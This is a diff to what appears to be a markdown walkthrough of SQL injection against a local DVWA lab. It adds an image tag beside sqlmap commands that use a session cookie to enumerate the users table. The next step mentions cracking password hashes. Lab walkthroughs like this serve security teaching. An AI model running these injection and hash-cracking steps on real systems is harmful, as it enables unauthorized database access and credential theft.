@@ -111,6 +111,7 @@ sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submi
 ``` 
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema  --columns -T users --batch 
 ```
+<img src="7.png">
 
 * Viewing table content and cracking password hashes:
 ``` 
